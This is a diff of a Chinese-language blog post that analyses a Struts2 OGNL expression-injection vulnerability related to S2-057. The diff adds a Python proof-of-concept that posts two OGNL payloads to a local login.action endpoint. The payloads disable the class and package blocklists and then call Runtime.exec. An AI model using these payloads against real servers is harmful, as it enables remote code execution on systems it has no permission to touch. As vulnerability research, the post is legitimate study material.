@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    903 字
+                    998 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      4 分钟
+                      5 分钟
                   </span>
                 
 
@@ -187,7 +187,24 @@
 <pre><code class="javascript">&lt;a id=&quot;64&quot; href=&quot;&quot;&gt;List available Employees&lt;/a&gt;
 </code></pre>
 <p>模板文件中的id值%{url}进行了双重评估，发生了表达式注入。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>同S2-057的payload，但是打不通，换成参考文章中使用的2.5.16版本的struts2就打通了，Struts 2.5.17也打不通，问题应该就出在Struts 2.5.17上面了。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>同S2-057的payload：</p>
+<pre><code class="python"># -*- coding:utf8 -*-
+import requests
+
+
+url = &quot;http://localhost:8080/login.action&quot;
+data1 = {
+    &quot;username&quot;: &quot;%{(#context=#attr[&#39;struts.valueStack&#39;].context).(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#39;&#39;)).(#ognlUtil.setExcludedPackageNames(&#39;&#39;))}&quot;
+}
+data2 = {
+    &quot;username&quot;: &quot;%{(#context=#attr[&#39;struts.valueStack&#39;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))}&quot;
+}
+res1 = requests.post(url, data=data1)
+print(res1.text)
+res2 = requests.post(url, data=data2)
+print(res2.text)
+</code></pre>
+<p>但是打不通，换成参考文章中使用的2.5.16版本的struts2就打通了，Struts 2.5.17也打不通，问题应该就出在Struts 2.5.17上面了。</p>
 <p>在Struts 2.5.17中，此时通过：</p>
 <pre><code>#attr[&#39;struts.valueStack&#39;].context
 </code></pre><p>无法获取到OgnlValueStack中的context，调试找到OgnlRuntime类的getFieldValue函数中：</p>
@@ -327,6 +344,11 @@ if (isPackageExcluded(targetClass.getPackage(), memberClass.getPackage())) {
               
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2022/04/17/struts2系列漏洞-S2-061/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>struts2系列漏洞 S2-061</span>
+                      </a>
                     
                   </div>
                   <div class="post-next col-12 col-md-6">
